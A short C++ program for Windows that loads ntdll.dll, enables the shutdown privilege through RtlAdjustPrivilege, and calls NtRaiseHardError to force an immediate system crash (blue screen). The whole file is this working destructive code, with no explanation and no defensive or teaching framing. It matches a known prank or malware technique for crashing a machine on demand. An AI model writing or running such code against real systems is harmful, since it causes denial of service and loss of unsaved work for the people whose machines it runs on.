#include <Windows.h>
#include <iostream>

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

int main()
{    
    BOOLEAN f;
    ULONG u;
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) {
        ntdll = GetModuleHandleA("ntdll.dll");
    }
    pdef_RtlAdjustPrivilege t = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    pdef_NtRaiseHardError N = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");    
    NTSTATUS NtRet = t(19, TRUE, FALSE, &f);
    N(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &u);
    return 0;
}